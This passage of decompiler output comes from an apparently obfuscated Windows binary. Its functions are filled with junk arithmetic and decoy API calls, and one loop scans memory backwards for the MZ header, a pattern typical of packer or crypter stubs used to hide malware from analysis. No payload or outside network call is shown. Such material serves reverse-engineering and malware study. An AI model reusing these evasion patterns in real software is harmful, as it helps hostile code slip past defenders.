  unsigned int v93; // [esp+D4h] [ebp-4h]
  int v94; // [esp+E0h] [ebp+8h]

  Sleep(2u);
  v57 = v89 + v56;
  v88 &= v54;
  if ( v54 == v57 )
  {
    v58 = v57 - 43934;
    v59 = ((v58 | 0x5000000000i64) + (unsigned __int64)(unsigned int)(v88 + 243)) >> 32;
    v88 += v58 + 243;
    v87 -= v59;
    if ( v55 != v92 )
    {
      v54 |= v58;
      v58 += 21498;
      v88 |= v58;
    }
    v90 &= v54;
    v93 = (__PAIR64__(v93, v58) - __PAIR64__(v58 - v54, v54)) >> 32;
  }
  v88 = -161904092;
  v93 |= (2 * ((v93 | 0x1F2B) - 161904091)) | 0x1F2B;
  v89 = 102;
  v60 = v93 - 0xF200004297i64;
  v91 = v91 - v55 - 55213;
  v87 = (0x84000041D7i64 - __PAIR64__((HIDWORD(v60) - 16613) ^ 0x8Cu, (HIDWORD(v60) - 16613) ^ 0x8Cu)) >> 32;
  v90 = 16855 - ((HIDWORD(v60) - 16613) ^ 0x8C) + 2531;
  GetStdHandle(0xFFFFFFF4);
  v93 = (HIDWORD(v60) | (v93 - 17047)) - (v69 + 219);
  v92 = 210;
  v63 = (v62 - 51556) | 0xC7;
  v64 = v91 ^ v63;
  v94 = v61 + 51556;
  if ( (v61 & v64) == 0 )
  {
    v61 -= v89;
    v64 = v64 - v88 + 28116;
  }
  v87 += v64 - 352 + (v64 < 0x160);
  v92 |= v61;
  for ( i = 0; i < 4; ++i )
  {
    GetVersionExA(&VersionInformation);
    v84 = &v92;
    v85 = v87 * v92;
  }
  v93 = v92 + 94718;
  v88 &= v87 * v92;
  v88 ^= (unsigned int)&v92;
  if ( ((unsigned int)&v92 & v91) != 0 )
  {
    v89 |= 0x9760u;
    v92 &= 0x5DC0u;
  }
  v92 += 53532;
  v90 -= 205;
  for ( j = 0; j < 4; ++j )
  {
    GetTickCount();
    v92 -= 5;
    v66 = v92 & v65;
    v68 = v88 + v67;
    v69 = v81 < v66;
    if ( v81 >= v66 )
    {
      v91 = (__PAIR64__(v91, v81) - (v66 | 0x2C00000000i64)) >> 32;
      v90 -= 35256;
      v69 = 0;
    }
    v91 -= v69 + v68;
    v79 = &v90;
    v70 = (int)v87 * (__int64)v90;
    LODWORD(v70) = v88 * v70;
    v82 -= HIDWORD(v70);
    v92 -= v70;
    v88 = v70 | 0xA9AC;
    v71 = HIDWORD(v70) & (unsigned int)&v90;
    v82 -= HIDWORD(v70) & (unsigned int)&v90;
    if ( HIDWORD(v70) <= (HIDWORD(v70) & (unsigned int)&v90) )
    {
      v72 = (HIDWORD(v70) < v71) + v71 + 36866;
      v87 |= v70;
      v69 = __CFADD__(v72, v88);
      v88 += v72;
      LODWORD(v70) = -v69 ^ v70;
      v89 += 49596;
      v71 = v80 | v72 ^ 0xEB28;
    }
    result = -((unsigned int)v70 < __CFADD__(v71, 140) + v71 + 140);
    v89 &= 0xF8u;
    if ( v89 == 115 )
    {
      v78 = &v88;
      v82 = v88 - 361642356;
      v89 = 115 - ((__PAIR64__(&v88, v88 - 180821178) + 4114146118u) >> 32);
      v74 = (unsigned int)&v88 ^ (v88 - 180821178);
      if ( ((unsigned int)&v88 & (v88 - 361642356)) == 0 )
      {
        v82 &= (unsigned int)&a54 + 3;
        v87 -= (unsigned int)&a54 + 3;
        v91 |= 0x54ABu;
        v94 |= v74;
      }
      v75 = v80 + v74;
      v87 &= v75;
      v94 += v75;
      v76 = v82 + (v89 & 0xF5A5294A);
      LOWORD(v75) = (__PAIR64__(v75, v87) - (v76 | 0x388800000000i64)) >> 32;
      v87 -= v76;
      v90 &= v76;
      v92 += (int)&v88;
      v80 |= v76;
      result = v82 ^ v94 ^ ((_WORD)v76 + (_WORD)v75 - (_WORD)v80) & 0xA260;
    }
  }
  return result;
}
// 401EA3: variable 'v56' is possibly undefined
// 401EA6: variable 'v54' is possibly undefined
// 401EC3: variable 'v55' is possibly undefined
// 401FAC: variable 'v69' is possibly undefined
// 401FBA: variable 'v62' is possibly undefined
// 401FCD: variable 'v61' is possibly undefined
// 402081: variable 'v65' is possibly undefined
// 402084: variable 'v67' is possibly undefined

//----- (004021BA) --------------------------------------------------------
void __stdcall sub_4021BA(__int64 a1)
{
  char v1; // cf
  BOOL v2; // eax
  unsigned int v3; // edx
  int v4; // ecx
  int v5; // eax
  int v6; // eax
  int v7; // ecx
  int v8; // ecx
  int v9; // edx
  int v10; // edx
  bool v11; // cf
  unsigned int v12; // eax
  int v13; // ett
  DWORD LastError; // eax
  int v15; // edx
  int v16; // ecx
  int v17; // eax
  BOOL Version; // eax
  int v19; // ecx
  int v20; // edx
  int v21; // edx
  unsigned int v22; // ecx
  unsigned int v23; // eax
  int v24; // edx
  int v25; // ett
  unsigned int v26; // edx
  int v27; // ecx
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-DCh] BYREF
  LARGE_INTEGER v29; // [esp+94h] [ebp-48h] BYREF
  int j; // [esp+A0h] [ebp-3Ch]
  int v31; // [esp+A8h] [ebp-34h]
  int i; // [esp+ACh] [ebp-30h]
  int *v33; // [esp+B0h] [ebp-2Ch]
  int *v34; // [esp+B4h] [ebp-28h]
  LARGE_INTEGER PerformanceCount; // [esp+B8h] [ebp-24h] BYREF
  int v36; // [esp+C0h] [ebp-1Ch] BYREF
  unsigned int v37; // [esp+C4h] [ebp-18h]
  unsigned int v38; // [esp+C8h] [ebp-14h]
  int v39; // [esp+CCh] [ebp-10h]
  unsigned int v40; // [esp+D0h] [ebp-Ch]
  int v41; // [esp+D4h] [ebp-8h]
  unsigned int v42; // [esp+D8h] [ebp-4h]
  int v43; // [esp+E4h] [ebp+8h]

  v2 = QueryPerformanceCounter(&PerformanceCount);
  v37 += 5461;
  v5 = ((__PAIR64__(v2, v3) - __PAIR64__(v42, (unsigned int)v1 + 64211)) >> 32) + 35790;
  if ( (v5 & 0x3FDA) == 0 )
  {
    v37 |= v4;
    v6 = v5 - v4;
    LODWORD(a1) = a1 ^ 0x3005;
    v7 = (2 * v4) | 0xBC4C;
    if ( v40 != v7 )
    {
      v38 += 227;
      HIDWORD(a1) ^= v6 ^ a1 & v7;
    }
    v40 += v6 + (v3 - (v1 + 64211) < v37);
  }
  v36 = -196645386;
  v34 = &v36;
  v33 = &v36;
  v40 = 0;
  GetStdHandle(0xFFFFFFF5);
  v10 = v9 - (v1 + v41);
  v11 = 0;
  if ( v10 >= 0 )
  {
    v10 = (HIDWORD(a1) | v10) + 23111;
    v11 = __CFADD__(v36, v8);
    v8 += v36;
  }
  v37 += v10 + v11;
  v39 = 199;
  v38 = v40 + 199;
  v12 = (v36 & v8) + (v36 & v8) + (((v40 | 0xC700000000i64) + __PAIR64__(v40, 199)) >> 32);
  v13 = (__PAIR64__(v12, v40) + 158) >> 32;
  v40 += 158;
  v41 -= v13;
  v42 ^= v12;
  v43 = a1 - 25573;
  for ( i = 0; i < 1; ++i )
  {
    LastError = GetLastError();
    v42 -= 14749;
    v17 = 2 * (v37 ^ LastError ^ 0xF57D);
    v37 -= v16;
    if ( (v17 & v37) == 0 )
    {
      v41 += v15;
      v31 ^= 0xAE79u;
      v43 = v16 + (v15 | v43);
      v38 &= 0x75u;
    }
    v38 &= 0x1Du;
    Version = GetVersionExA(&VersionInformation);
    v39 |= v19;
    v21 = v20 + 39484;
    v22 = v19 - 164;
    v23 = Version - v36;
    if ( (v23 & v39) == 0 )
    {
      v37 -= v22;
      v24 = (v43 + v21) | 0xEA33;
      if ( v23 >= v22 )
      {
        v31 += 116;
        v24 ^= v22;
        v25 = (__PAIR64__(v23, v22) + 28239) >> 32;
        v22 += 28239;
        v41 -= v25;
      }
      v31 ^= v36 | v24;
      v31 |= v22;
    }
  }
  Sleep(0xFu);
  v42 += v27 + (v26 < 0x25D5);
  for ( j = 0; j < 4; ++j )
    QueryPerformanceCounter(&v29);
  Sleep(0xFu);
}
// 4021CD: variable 'v3' is possibly undefined
// 4021CD: variable 'v1' is possibly undefined
// 4021E9: variable 'v4' is possibly undefined
// 402252: variable 'v9' is possibly undefined
// 402262: variable 'v8' is possibly undefined
// 4022CB: variable 'v16' is possibly undefined
// 4022D3: variable 'v15' is possibly undefined
// 402321: variable 'v19' is possibly undefined
// 402324: variable 'v20' is possibly undefined
// 402388: variable 'v27' is possibly undefined
// 402382: variable 'v26' is possibly undefined

//----- (0040242F) --------------------------------------------------------
int __stdcall sub_40242F(int a1, void (__stdcall *a2)(int, _DWORD, int), int a3)
{
  int result; // eax
  int j; // [esp+8h] [ebp-10h]
  int i; // [esp+10h] [ebp-8h]

  a2(a1, a2, a3);
  for ( i = 0; i < 4; ++i )
  {
    for ( j = 0; j < 1; ++j )
    {
      sub_40275F((int)"s4gmb9899 v", 12548, -20762488);
      result = 33349;
    }
  }
  return result;
}

//----- (004024FA) --------------------------------------------------------
int __fastcall sub_4024FA(int a1, int a2, int a3, int a4, unsigned int a5)
{
  int v5; // ecx
  int v6; // edx
  unsigned int v7; // kr00_4
  unsigned int v8; // eax
  int v9; // ett
  unsigned int v10; // edx
  int v11; // ecx
  char v12; // cf
  unsigned int v13; // eax
  HANDLE MutexA; // eax
  unsigned int v15; // edx
  unsigned int v16; // eax
  unsigned int v17; // ecx
  int result; // eax
  int i; // [esp+8h] [ebp-28h]
  int v20; // [esp+10h] [ebp-20h]
  int v21; // [esp+14h] [ebp-1Ch]
  int v22; // [esp+18h] [ebp-18h]
  unsigned int v23; // [esp+18h] [ebp-18h]
  signed int v24; // [esp+1Ch] [ebp-14h]
  int v25; // [esp+24h] [ebp-Ch]
  int v26; // [esp+28h] [ebp-8h]
  int v27; // [esp+28h] [ebp-8h]
  int v28; // [esp+28h] [ebp-8h]

  a5 = 156;
  v24 = a2 - 170474639;
  v23 = v22 & 0xF5D6C371;
  a4 = a4 & 0xC204 | 0xD71;
  v21 = 210;
  v20 = 0;
  if ( ((a2 - 170474639) | -v12) == -170474716 )
    v26 += 29859;
  Sleep(0xDu);
  GetProcessHeap();
  v25 = 146;
  a4 = 0 / (int)(a5 + 1);
  v5 = v24 + a5 + 1;
  if ( v5 >= 0 )
  {
    v5 = 0;
    a3 -= 0 % (int)(a5 + 1);
  }
  v27 = v26 - ((((unsigned int)v5 | 0x5F2700000000ui64) + 20630) >> 32);
  GetCurrentThreadId();
  for ( i = 0; i < 4; ++i )
  {
    GetCurrentProcess();
    v6 = v24 % (v21 + 1);
    a4 *= v24 / (v21 + 1);
    v12 = __CFADD__(__CFADD__(v21 + 1, v6), v27) | __CFADD__(v21 + 1, __CFADD__(v21 + 1, v6) + v27);
    v7 = v21 + 1 + v6;
    v28 = (__PAIR64__(v27, v21 + 1) + __PAIR64__(v21 + 1, v6)) >> 32;
    v8 = v7 + v12 + a4;
    if ( v8 >= v7 )
    {
      v24 = (__PAIR64__(v24, v8) - __PAIR64__(v7, v7)) >> 32;
      if ( (v7 < 0x2F29) + v7 - 12073 + 57853 >= 0xF01B37CA )
      {
        v9 = (((unsigned int)a3 | 0x877800000000ui64) + 42579) >> 32;
        a3 += 42579;
        a3 -= v9;
        v20 &= 0xBFu;
      }
      a5 += 55;
    }
    a5 += v8;
    a3 = -162456133;
    v10 = (unsigned int)&a3;
    v11 = v24 + 35;
    v12 = a5 < v24 + 35;
    a5 -= v24 + 35;
    v27 = (__CFADD__(v12, &a3) | __CFADD__((char *)&a3 + v12, 59024)) + v28 + 50477;
    v25 |= v24 + 35;
    if ( (int)&a3 >= v24 + 35 )
    {
      v13 = ((unsigned int)&a3 + v12 + 59024) | 0x50EC;
      v21 -= v13;
      a3 ^= v13;
      v11 = v20 | (v24 + 150);
      v23 |= v11;
      v20 = v20 - v13 + 49393;
      a5 -= v13;
      v10 = (v27 | (((unsigned int)&a3 ^ 0x196) + 45194)) - a5;
    }
    v24 ^= v10;
    v21 += v11;
  }
  MutexA = CreateMutexA(0, 1, 0);
  v16 = (__PAIR64__((unsigned int)MutexA, v15) - ((unsigned int)v20 | 0xC8F200000000i64)) >> 32;
  if ( v16 <= v17 )
  {
    result = ((_BYTE)v16 - 54) & 0x90;
    if ( (result & 0xF01B37CA) != 0 )
      return result;
    v16 = result & 0x56;
  }
  return v16 - a3;
}
// 402548: variable 'v22' is possibly undefined
// 40256F: variable 'v12' is possibly undefined
// 40259C: variable 'v26' is possibly undefined
// 40270C: variable 'v15' is possibly undefined
// 402713: variable 'v17' is possibly undefined

//----- (0040275F) --------------------------------------------------------
// local variable allocation has failed, the output may be wrong!
int __stdcall sub_40275F(int a1, int a2, int a3)
{
  int v3; // eax
  unsigned int v4; // ecx
  char *v5; // edx
  int v6; // edx
  int v7; // ecx
  char v8; // cf
  unsigned int v9; // ett
  int v10; // ett
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-D0h] BYREF
  int *v13; // [esp+94h] [ebp-3Ch]
  int i; // [esp+98h] [ebp-38h]
  int *v15; // [esp+9Ch] [ebp-34h]
  int *v16; // [esp+A0h] [ebp-30h]
  int v17; // [esp+ACh] [ebp-24h] BYREF
  int v18; // [esp+B0h] [ebp-20h]
  unsigned int v19; // [esp+B4h] [ebp-1Ch]
  int v20; // [esp+B8h] [ebp-18h] BYREF
  int v21; // [esp+BCh] [ebp-14h] BYREF
  int v22; // [esp+C0h] [ebp-10h]
  int v23; // [esp+C4h] [ebp-Ch]
  int v24; // [esp+C8h] [ebp-8h]
  unsigned int v25; // [esp+CCh] [ebp-4h]

  Sleep(0xAu);
  v20 = 28525;
  GetVersionExA(&VersionInformation);
  v16 = &v20;
  v3 = v20 + 52887;
  v22 = 142;
  v17 = v20 - 189976371;
  if ( (int)&STACK[0x16A73BBE] >= v20 + 52887 )
  {
    v4 = (unsigned int)&STACK[0xB539DF4] + ((unsigned int)&STACK[0x16A73BBE] < v20 + 52887) + v3;
    v5 = (char *)&STACK[0x16A73BBE]
       + (__CFADD__((unsigned int)&STACK[0x16A73BBE] < v20 + 52887, &STACK[0xB539DF4]) | __CFADD__(
                                                                                           v3,
                                                                                           (char *)&STACK[0xB539DF4]
                                                                                         + ((unsigned int)&STACK[0x16A73BBE] < v20 + 52887)))
       + 17452;
    v25 += 33480;
    v3 = v23 + (((_WORD)v20 - 12649) & 0x31C6);
    if ( v3 )
      v20 -= (unsigned int)&v5[__PAIR64__(v4, v25)] >> 32;
    v25 -= v21 ^ v4;
  }
  v23 &= v3;
  v21 = 221;
  v15 = &v21;
  v17 *= 221 - v20;
  v18 = -212288382;
  for ( i = 0; i < 2; ++i )
  {
    v13 = &v17;
    v24 = 40217;
    v6 = v17 | 0x4A1C;
    v20 -= (v17 | 0x4A1C) + (v18 | 0x9D19);
    v7 = v18 | 0x9D19;
    v23 |= 0x7Du;
    v17 |= v18 | 0x9D19;
    if ( ((v18 | 0x9D19) & v6) == 0 )
      v7 = ((__PAIR64__(v20 + v7, v6) - ((unsigned int)v6 | 0x52A500000000i64)) >> 32) - v17;
    v25 -= v7;
  }
  v21 *= (int)(v22 & 0xF4AC62C4) / -190029115;
  if ( !v21 )
  {
    v9 = -190000889;
    v8 = v19 < v9;
    v19 -= v9;
    v10 = v8;
    v8 = __CFADD__(v8, v17) | __CFADD__(v8 + v17, 55);
    v17 += v10 + 55;
    v25 = (__PAIR64__(v25, v19) - (v8 | 0xC200000000i64)) >> 32;
    v19 -= v8;
  }
  return (v17 & 0xCD) - 190029116;
}
// 402838: exceedingly huge offset into the stack frame
// 402836: exceedingly huge offset into the stack frame
// 40283A: exceedingly huge offset into the stack frame
// 40283C: exceedingly huge offset into the stack frame

//----- (00402962) --------------------------------------------------------
_WORD *sub_402962()
{
  int v0; // edx
  int v1; // ecx
  int v2; // edx
  unsigned __int64 v3; // kr00_8
  __int64 v4; // rax
  bool v5; // cf
  int i; // [esp+Ch] [ebp-2Ch]
  int v8; // [esp+1Ch] [ebp-1Ch]
  int v9[2]; // [esp+20h] [ebp-18h] BYREF
  int v10; // [esp+28h] [ebp-10h]
  int v11; // [esp+2Ch] [ebp-Ch] BYREF
  int v12; // [esp+30h] [ebp-8h]
  _WORD *v13; // [esp+34h] [ebp-4h]

  v13 = (_WORD *)(&loc_401FFF + 1);
  v11 = 42;
  v9[1] = (int)&v11;
  v12 = 3651;
  v10 = (((v10 - 27055) | 0x502) ^ 0x6353) & 0xB41;
  CreateMutexA(0, 0, 0);
  v12 ^= 0x2EA3u;
  v1 = 0;
  if ( v0 )
  {
    v1 = 104;
    v12 -= 104;
    v0 = v10 ^ (v0 - ((v0 != 0) + 12767));
  }
  v2 = v11 & (v0 - 18410);
  v5 = __CFADD__(v1, v11);
  v11 += v1;
  v11 += v2 + (__CFADD__(v5, v1) | __CFADD__(v2, v5 + v1));
  v10 = 106;
  sub_401D07(v12, 106);
  while ( *v13 != 23117 )
    v13 -= 2048;
  sub_402D4E(126, 126);
  v8 = 30266;
  v9[0] = -916030630;
  for ( i = 0; i < 5; ++i )
  {
    v4 = -182094729i64 * v9[0];
    v8 += v4;
    v5 = __PAIR64__(v9, v9[0]) < 0x46E100000013i64;
    v3 = __PAIR64__(v9, v9[0]) - 0x46E100000013i64;
    v9[0] -= 19;
    LODWORD(v4) = v5 + (_DWORD)v4 + 21226;
    if ( ((unsigned int)v4 & v9[0]) == 0 )
    {
      v5 = __PAIR64__(v4, v8) < 0xEF2E0000002Fi64;
      LODWORD(v4) = (__PAIR64__(v4, v8) - 0xEF2E0000002Fi64) >> 32;
      if ( (_DWORD)v4 == HIDWORD(v3) )
      {
        HIDWORD(v4) -= v4;
        v9[0] = v9[0] & 0x4F40;
      }
      v8 = (((_WORD)v4 + v5 + (_WORD)v8 - 47) & 0xE0C9) - HIDWORD(v4);
    }
  }
  return v13;
}
// 402A0F: variable 'v0' is possibly undefined

//----- (00402B1C) --------------------------------------------------------
DWORD __stdcall sub_402B1C(int a1, int a2, int a3)
{
  int v3; // ecx
  unsigned __int64 v4; // kr00_8
  BOOL Version; // eax
  int v6; // edx
  int v7; // ecx
  int v8; // eax
  HANDLE MutexA; // eax
  __int64 v10; // rax
  bool v11; // cf
  struct _OSVERSIONINFOA v13; // [esp+0h] [ebp-168h] BYREF
  struct _OSVERSIONINFOA VersionInformation; // [esp+94h] [ebp-D4h] BYREF
  int *v15; // [esp+128h] [ebp-40h]
  int v16; // [esp+12Ch] [ebp-3Ch]
  unsigned int *v17; // [esp+130h] [ebp-38h]
  int *v18; // [esp+134h] [ebp-34h]
  int i; // [esp+13Ch] [ebp-2Ch]
  int v20; // [esp+140h] [ebp-28h] BYREF
  int v21; // [esp+144h] [ebp-24h] BYREF
  unsigned int v22; // [esp+148h] [ebp-20h] BYREF
  int v23; // [esp+14Ch] [ebp-1Ch]
  int v24; // [esp+150h] [ebp-18h]
  unsigned int v25; // [esp+154h] [ebp-14h]
  int v26; // [esp+158h] [ebp-10h]
  int v27; // [esp+15Ch] [ebp-Ch]
  int v28; // [esp+160h] [ebp-8h]
  int v29; // [esp+164h] [ebp-4h]
  int v30; // [esp+174h] [ebp+Ch]

  Sleep(2u);
  for ( i = 0; i < 3; ++i )
    GetLastError();
  v24 = 63666;
  v26 &= v3;
  v27 -= v3;
  v21 = v3 - 10107;
  v20 = 85188;
  v23 = 185;
  v29 = 193;
  GetVersionExA(&VersionInformation);
  v22 = 14155;
  v18 = &v21;
  v17 = &v22;
  v20 *= v21 / 14156;
  v26 = 46786;
  v11 = (unsigned __int64)(315665142i64 * v20) >> 32 != 0;
  v20 *= 315665142;
  v4 = __PAIR64__(14156 - ((unsigned int)v11 + 45540), v21) - 0xB6C2000000A9i64;
  v21 -= 169;
  if ( !HIDWORD(v4) )
    v29 ^= -(v20 ^ (v20 | 0xEB));
  Version = GetVersionExA(&v13);
  v22 ^= v6;
  v8 = v20 | Version;
  v30 = v7 + 8;
  if ( (v8 & v21) == 0 )
  {
    v22 ^= v6;
    v28 ^= 0x75u;
    v7 = (v7 & 0xD18D) - 54397;
    v25 -= v8;
    v25 = (__PAIR64__(v25, v8) - __PAIR64__(v7, v7)) >> 32;
  }
  v20 -= v7;
  if ( v30 != 37144 )
  {
    MutexA = CreateMutexA(0, 0, 0);
    v16 &= 0x5611u;
    v24 += 31691;
    if ( 2 * (_DWORD)MutexA != v16 )
    {
      v21 ^= 0x43u;
      v26 |= 0x1A5Bu;
      v25 -= 13710;
    }
    v24 += 24309;
    CreateEventA(0, 1, 0, 0);
    v15 = &v20;
    v10 = v24 * (__int64)v20;
    v25 = v24 * v20;
    HIDWORD(v10) = (HIDWORD(v10) - ((_DWORD)&v20 + (HIDWORD(v10) != 0))) | 0x406B;
    if ( (unsigned int)&v20 <= HIDWORD(v10) )
    {
      v20 += v10;
      v28 += v24 | (unsigned int)&v20;
      v20 -= 44628;
      v11 = HIDWORD(v10) < v22;
      if ( SHIDWORD(v10) >= (int)v22 )
      {
        v23 += (v24 | (unsigned int)&v20) + (HIDWORD(v10) < v22);
        HIDWORD(v10) -= 21534;
        v11 = 0;
      }
      v26 += HIDWORD(v10) + v11;
    }
    v25 ^= 0x623Bu;
  }
  return GetTickCount();
}
// 402B68: variable 'v3' is possibly undefined
// 402C25: variable 'v6' is possibly undefined
// 402C2B: variable 'v7' is possibly undefined

//----- (00402D4E) --------------------------------------------------------
DWORD __stdcall sub_402D4E(int a1, int a2)
{
  DWORD result; // eax
  int v3; // edx
  __int16 v4; // cx

  Sleep(0xAu);
  Sleep(2u);
  CreateMutexA(0, 1, 0);
  GetProcessHeap();
  result = GetCurrentThreadId();
  if ( ((v4 - 15086) & 0x4208) == 0 )
    result -= v3;
  return result;
}
// 402E1B: variable 'v4' is possibly undefined
// 402E37: variable 'v3' is possibly undefined

//----- (00402E4B) --------------------------------------------------------
int __usercall sub_402E4B@<eax>(int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>)
{
  unsigned int v3; // eax
  int v4; // edx
  int v5; // edx
  BOOL v6; // ett
  int v7; // edx
  unsigned int v8; // ecx
  unsigned __int64 v9; // kr00_8
  bool v10; // cf
  unsigned int v11; // ecx
  int v12; // eax
  int i; // [esp+14h] [ebp-2Ch]
  int v15; // [esp+1Ch] [ebp-24h] BYREF
  int v16; // [esp+20h] [ebp-20h]
  unsigned int v17; // [esp+24h] [ebp-1Ch]
  __int64 v18; // [esp+28h] [ebp-18h]
  int v19; // [esp+34h] [ebp-Ch]
  unsigned int v20; // [esp+38h] [ebp-8h]
  unsigned int v21; // [esp+3Ch] [ebp-4h]

  v20 = 28081;
  v19 = -131504935;
  v3 = a1 - HIDWORD(v18);
  LODWORD(v18) = v3 | v18;
  HIDWORD(v18) |= 0x39u;
  if ( (a2 & 0x6DB1) != 0 )
  {
    HIDWORD(v18) = (__PAIR64__(v3 & HIDWORD(v18), v19) + 0x31370000CDEFi64) >> 32;
    v19 = (v19 + 52719) ^ 0x39EC;
    v3 = 0;
    v10 = __CFADD__(v19, a2);
    v4 = v19 + a2;
    v6 = v10;
    v10 = __CFADD__(v10, v4);
    v5 = v6 + v4;
    v10 |= __CFADD__(a3, v5);
    a2 = v20 | (a3 + v5);
    a3 = a3 - (v10 + HIDWORD(v18)) - v18;
  }
  LODWORD(v18) = v3 & v18;
  v18 += v3 | 0xB08100000000i64;
  LODWORD(v18) = v3 & v18;
  v7 = ((v20 + a2) | 0xF590) - 31824;
  v19 |= v7;
  v20 ^= v7;
  if ( (a3 & v19) == 0 )
  {
    v3 -= 29098;
    v20 -= 56570;
    LODWORD(v18) = v18 + 54000;
  }
  LODWORD(v18) = a3 | v18;
  v8 = a3 - v20;
  v20 += 34621;
  v9 = __PAIR64__(v8, v3) - __PAIR64__(v20, 38420);
  HIDWORD(v18) += (__PAIR64__(v8, v3) < __PAIR64__(v20, 38420)) + 46373;
  v10 = (unsigned int)v9 < HIDWORD(v9);
  if ( (unsigned int)v9 <= HIDWORD(v9) )
    v10 = 0;
  LODWORD(v18) = v18 - (v10 + 59286);
  v19 += 162;
  v20 += 6981;
  v20 += 38210;
  v19 += 106;
  v21 = dword_443160 ^ (dword_443160 << 11);
  v16 = 26058;
  v15 = 151;
  v17 = 302;
  v11 = (unsigned int)&v15 | 0x79;
  if ( ((302 - v11) & v11 & 0x80000000) == 0 )
  {
    v10 = __CFADD__(&v15, v17);
    v17 += (unsigned int)&v15;
    v12 = (__PAIR64__(302 - ((unsigned int)&v15 | 0x79), v11) - __PAIR64__(v17, (unsigned int)&v15 + v10)) >> 32;
    v16 -= 4160;
    v15 -= v12;
    if ( v12 != v16 )
      goto LABEL_11;
    v17 += 21525;
    v17 |= 0xA2u;
  }
  LOWORD(v17) = v17 + 25151;
  v17 &= 0x26D9u;
LABEL_11:
  if ( v15 >= -173776719 )
  {
    for ( i = 0; i < 1; ++i )
      v15 -= v16 * v15;
    v16 *= v15 / (int)(v17 + 1);
  }
  dword_443160 = dword_443190;
  dword_443190 = dword_4431AC;
  dword_4431AC = dword_443148;
  dword_443148 ^= (v21 >> 8) ^ v21 ^ ((unsigned int)dword_443148 >> 19);
  return dword_443148;
}
// 443148: using guessed type int dword_443148;
// 443160: using guessed type int dword_443160;
// 443190: using guessed type int dword_443190;
// 4431AC: using guessed type int dword_4431AC;

//----- (0040316E) --------------------------------------------------------
#error "4031C5: call analysis failed (funcsize=75)"

//----- (0040327C) --------------------------------------------------------
int __stdcall sub_40327C(int a1)
{
  int v1; // eax
  unsigned int v2; // edx
  int v3; // ecx
  int v4; // eax
  int v5; // edx
  int v6; // ecx
  int v7; // eax
  bool v8; // cf
  unsigned int v9; // ecx
  __int64 v10; // rax
  bool v11; // cf
  __int64 v12; // rax
  int v13; // edx
  int v14; // eax
  unsigned int v15; // ecx
  char v16; // cf
  unsigned int v17; // eax
  int v18; // eax
  unsigned int v19; // ecx
  unsigned int v20; // edx
  unsigned int v21; // eax
  int v22; // eax
  unsigned int v23; // kr00_4
  int v24; // ecx
  unsigned int v25; // edx
  bool v26; // cf
  unsigned __int64 v27; // kr08_8
  unsigned int v28; // eax
  unsigned int v29; // edx
  unsigned int v30; // eax
  int v31; // edx
  unsigned int v32; // ett
  int v33; // edx
  int v34; // ecx
  int v35; // edx
  struct _OSVERSIONINFOA VersionInformation; // [esp+0h] [ebp-114h] BYREF
  unsigned int v38; // [esp+94h] [ebp-80h]
  int v39; // [esp+98h] [ebp-7Ch]
  int v40; // [esp+9Ch] [ebp-78h]
  int *v41; // [esp+A0h] [ebp-74h]
  int v42[3]; // [esp+A4h] [ebp-70h] BYREF
  int v43; // [esp+B0h] [ebp-64h] BYREF
  unsigned int v44; // [esp+C8h] [ebp-4Ch]
  unsigned int v45; // [esp+CCh] [ebp-48h]
  int v46; // [esp+D0h] [ebp-44h] BYREF
  int v47; // [esp+D4h] [ebp-40h]
  int v48; // [esp+D8h] [ebp-3Ch]
  unsigned int v49; // [esp+DCh] [ebp-38h]
  unsigned int v50; // [esp+E0h] [ebp-34h]
  unsigned int v51; // [esp+E8h] [ebp-2Ch]
  unsigned int *v52; // [esp+ECh] [ebp-28h]
  int *v53; // [esp+F0h] [ebp-24h]
  int v54; // [esp+F4h] [ebp-20h]
  int i; // [esp+F8h] [ebp-1Ch]
  unsigned int v56; // [esp+FCh] [ebp-18h] BYREF
  int v57; // [esp+100h] [ebp-14h] BYREF
  int v58; // [esp+104h] [ebp-10h]
  int v59; // [esp+108h] [ebp-Ch]
  int v60; // [esp+10Ch] [ebp-8h]
  int v61; // [esp+110h] [ebp-4h]

  v1 = 212;
  v60 = 318;
  v2 = 0;
  v58 = 0;
  v3 = 0;
  if ( a1 > 0 )
  {
    while ( 1 )
    {
      v61 = sub_402E4B(v1, v2, v3);
      for ( i = 0; i < 2; ++i )
      {
        v57 = 55263;
        v56 = 100;
        v53 = &v57;
        v52 = &v56;
        v4 = 547;
        v5 = 16;
        v54 = 547;
        v6 = v8 + 117;
        if ( (v6 & 0x99) != 0 )
        {
          v6 &= v56;
          v57 -= 4805;
          v7 = 563;
          v5 = v56 | 0x10;
          v8 = 0;
          if ( ((v56 | 0x10) & v57) != 0 )
          {
            v57 -= v5;
            v7 = 18235;
            v8 = __CFADD__(v57, 18235);
            v57 += 18235;
          }
          v57 -= v8 + v5;
          v4 = v7 + 49;
          v56 |= 0x4F3Au;
          v56 -= 9339;
        }
        v54 += v5;
        HIDWORD(v10) = v54 | v5;
        v54 -= v4;
        v57 &= HIDWORD(v10);
        v57 ^= 0x8Bu;
        LODWORD(v10) = v6 ^ (v4 - HIDWORD(v10));
        v9 = v6 - v54;
        v8 = v56 < HIDWORD(v10);
        v56 -= HIDWORD(v10);
        v56 += v8 + 40999;
        LODWORD(v10) = v56 | v10;
        v11 = 0;
        if ( (v9 & (unsigned int)v10) == 0 )
        {
          LODWORD(v10) = v10 - HIDWORD(v10);
          v57 -= v9;
          v11 = __CFADD__(v54, 49460);
          v54 += 49460;
        }
        HIDWORD(v10) = v10 | (v11 + HIDWORD(v10) + 44409);
        v12 = (HIDWORD(v10) | 0xFA00000000i64) + v10;
        v56 ^= 0xE3u;
      }
      v59 = -570619996;
      v51 = (__PAIR64__(v51, i) - __PAIR64__(v9, 2)) >> 32;
      v51 &= v9;
      v51 += 46901;
      v51 ^= 0x35u;
      v51 |= HIDWORD(v12);
      HIDWORD(v12) ^= v51;
      v14 = v51 + (v12 ^ 0x54) - HIDWORD(v12);
      v15 = v9 - v14;
      v51 -= v15;
      v16 = 0;
      v51 &= v14;
      v17 = v61;
      switch ( v61 )
      {
        case 0:
        case 1:
        case 2:
        case 3:
          goto LABEL_26;
        case 4:
          v18 = v61 + 48221;
          v50 = (__PAIR64__(v50, v61) + 0x60080000BC5Di64) >> 32;
          v19 = v15 - 54265;
          if ( v61 == -48221 )
          {
            v18 = 2881;
            v50 += 2881;
            v13 = (v49 | v13) + 50739;
            v19 -= 2881;
            v49 ^= v13;
          }
